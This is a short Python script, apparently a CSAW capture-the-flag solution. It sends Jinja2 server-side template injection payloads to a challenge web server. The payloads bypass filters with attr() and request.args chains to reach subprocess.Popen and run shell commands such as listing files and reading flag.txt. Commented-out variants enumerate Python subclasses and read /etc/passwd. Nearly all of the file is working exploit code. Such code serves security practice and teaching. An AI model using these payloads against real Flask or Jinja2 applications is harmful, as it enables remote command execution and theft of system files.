import requests

#dumps list of all used classes <-not needed
# response = requests.get("http://web.chal.csaw.io:5000/submit?value={{''|attr(request.args.class)|attr(request.args.mro)|attr(request.args.item)(2)|attr(request.args.subclass)()}}&bas=base&class=__class__&mro=__mro__&item=__getitem__&subclass=__subclasses__")

#reads /etc/passwd <-not needed
# response = requests.get("http://web.chal.csaw.io:5000/submit?value={{''|attr(request.args.class)|attr(request.args.mro)|attr(request.args.item)(2)|attr(request.args.subclass)()|attr(request.args.item)(40)('/etc/passwd')|attr('read')()}}&bas=base&class=__class__&mro=__mro__&item=__getitem__&subclass=__subclasses__")



#Could run injected javascript, however that was not useful <-how did I know that?-no opportunity for cookie swiping?

#Test for SSTI opportunity

#look for flag
# response = requests.get("http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)(%27ls%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__")

#cat flag
response = requests.get("http://web.chal.csaw.io:5000/submit?value={{()|attr(request.args.class)|attr(request.args.bas)|attr(request.args.sub)()|attr(request.args.item)(258)(%27cat flag.txt%27,shell=True,stdout=-1)|attr(%27communicate%27)()}}&class=__class__&bas=__base__&sub=__subclasses__&item=__getitem__")

print(response.status_code, response.reason)
print(response.content.decode())
